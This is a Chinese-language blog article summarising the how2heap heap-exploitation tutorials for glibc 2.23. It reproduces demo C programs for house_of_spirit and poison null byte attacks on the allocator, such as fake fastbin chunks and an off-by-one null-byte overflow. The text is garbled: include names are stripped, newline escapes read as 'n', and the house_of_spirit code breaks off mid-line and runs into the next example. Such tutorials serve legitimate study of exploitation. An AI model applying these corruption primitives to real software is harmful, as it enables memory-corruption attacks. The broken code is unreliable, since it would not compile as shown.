# 【技术分享】how2heap总结-下
##### 译文声明
本文是翻译文章，文章来源：安全客
译文仅供参考，具体内容表达以及含义原文为准。
作者：[7o8v_](http://bobao.360.cn/member/contribute?uid=2556795459)
预估稿费：300RMB
投稿方式：发送邮件至linwei#360.cn，或登陆网页版在线投稿
**0x00 前言**
****
"how2heap"是shellphish团队在Github上开源的 **堆漏洞** 系列教程.
我这段时间一直在学习堆漏洞利用方面的知识,看了这些利用技巧以后感觉受益匪浅.
这篇文章是我学习这个系列教程后的总结,在此和大家分享.我会尽量翻译原版教程的内容,方便英语不太好的同学学习.
不过在学习这些技巧之前,建议大家去看一看华庭写的"Glibc内存管理-Ptmalloc2源码分析"
在此也给出原版教程链接:
**补充**
****
上篇的总结因为在微信公众号发过了，所以不在这里发，可以到我的博客去看。博客：[reversing.win](http://reversing.win)
这次的翻译部分我决定再随性一点，每一句尽量使用我自己的理解。
而且原文有些错误的地方或者表意不明的地方我会在翻译部分修正，要是原文看不太明白，可以看我的翻译。
然后就是输出部分我就不贴了，大家想要学习的就自己在机器上输出看看。 😛
**0x01 测试环境**
****
Ubuntu 16.04.3 LTS x64
GLIBC 2.23
**0x02 目录**
****
house_of_spirit
poison_null_byte
house_of_lore
overlapping_chunks
overlapping_chunks_2
house_of_force
unsoted_bin_attack
**0x03 house_of_spirit**
****
源码：
    #include 
    #include 
    int main()
    {
       printf("This file demonstrates the house of spirit attack.n");
       printf("Calling malloc() once so that it sets up its memory.n");
       malloc(1);
       printf("We will now overwrite a pointer to point to a fake 'fastbin' region.n");
       unsigned long long *a;
       // This has nothing to do with fastbinsY (do not be fooled by the 10) - fake_chunks is just a piece of memory to fulfil allocations (pointed to from fastbinsY)
       unsigned long long fake_chunks[10] __attribute__ ((aligned (16)));
       printf("This region (memory of length: %lu) contains two chunks. The first starts at %p and the second at %p.n", sizeof(fake_chunks), &fake_chunks[1], &fake_chunks[7]);
       printf("This chunk.size of this region has to be 16 more than the region (to accomodate the chunk data) while still falling into the fastbin category ( 2*SIZE_SZ (> 16 on x64) && system_mem (
    #include 
    #include 
    #include 
    #include 
    int main()
    {
            printf("Welcome to poison null byte 2.0!n");
            printf("Tested in Ubuntu 14.04 64bit.n");
        printf("This technique can be used when you have an off-by-one into a malloc'ed region with a null byte.n");
        uint8_t* a;
        uint8_t* b;
        uint8_t* c;
        uint8_t* b1;
        uint8_t* b2;
        uint8_t* d;
        printf("We allocate 0x100 bytes for 'a'.n");
        a = (uint8_t*) malloc(0x100);
        printf("a: %pn", a);
        int real_a_size = malloc_usable_size(a);
        printf("Since we want to overflow 'a', we need to know the 'real' size of 'a' "
            "(it may be more than 0x100 because of rounding): %#xn", real_a_size);
        /* chunk size attribute cannot have a least significant byte with a value of 0x00.
         * the least significant byte of this will be 0x10, because the size of the chunk includes
         * the amount requested plus some amount required for the metadata. */
        b = (uint8_t*) malloc(0x200);
        printf("b: %pn", b);
        c = (uint8_t*) malloc(0x100);
        printf("c: %pn", c);
        uint64_t* b_size_ptr = (uint64_t*)(b - 8);
        // added fix for size==prev_size(next_chunk) check in newer versions of glibc
        // https://sourceware.org/git/?p=glibc.git;a=commitdiff;h=17f487b7afa7cd6c316040f3e6c86dc96b2eec30
        // this added check requires we are allowed to have null pointers in b (not just a c string)
        //*(size_t*)(b+0x1f0) = 0x200;
        printf("In newer versions of glibc we will need to have our updated size inside b itself to pass "
            "the check 'chunksize(P) != prev_size (next_chunk(P))'n");
        // we set this location to 0x200 since 0x200 == (0x211 & 0xff00)
        // which is the value of b.size after its first byte has been overwritten with a NULL byte
        *(size_t*)(b+0x1f0) = 0x200;
        // this technique works by overwriting the size metadata of a free chunk
        free(b);
        printf("b.size: %#lxn", *b_size_ptr);
        printf("b.size is: (0x200 + 0x10) | prev_in_usen");
        printf("We overflow 'a' with a single null byte into the metadata of 'b'n");
        a[real_a_size] = 0; // <--- THIS IS THE "EXPLOITED BUG"
        printf("b.size: %#lxn", *b_size_ptr);
        uint64_t* c_prev_size_ptr = ((uint64_t*)c)-2;
        printf("c.prev_size is %#lxn",*c_prev_size_ptr);
        // This malloc will result in a call to unlink on the chunk where b was.
        // The added check (commit id: 17f487b), if not properly handled as we did before,
        // will detect the heap corruption now.
        // The check is this: chunksize(P) != prev_size (next_chunk(P)) where
        // P == b-0x10, chunksize(P) == *(b-0x10+0x8) == 0x200 (was 0x210 before the overflow)
        // next_chunk(P) == b-0x10+0x200 == b+0x1f0
        // prev_size (next_chunk(P)) == *(b+0x1f0) == 0x200
        printf("We will pass the check since chunksize(P) == %#lx == %#lx == prev_size (next_chunk(P))n",
            *((size_t*)(b-0x8)), *(size_t*)(b-0x10 + *((size_t*)(b-0x8))));
        b1 = malloc(0x100);
        printf("b1: %pn",b1);
        printf("Now we malloc 'b1'. It will be placed where 'b' was. "
            "At this point c.prev_size should have been updated, but it was not: %lxn",*c_prev_size_ptr);
        printf("Interestingly, the updated value of c.prev_size has been written 0x10 bytes "
            "before c.prev_size: %lxn",*(((uint64_t*)c)-4));
        printf("We malloc 'b2', our 'victim' chunk.n");
        // Typically b2 (the victim) will be a structure with valuable pointers that we want to control
        b2 = malloc(0x80);
        printf("b2: %pn",b2);
        memset(b2,'B',0x80);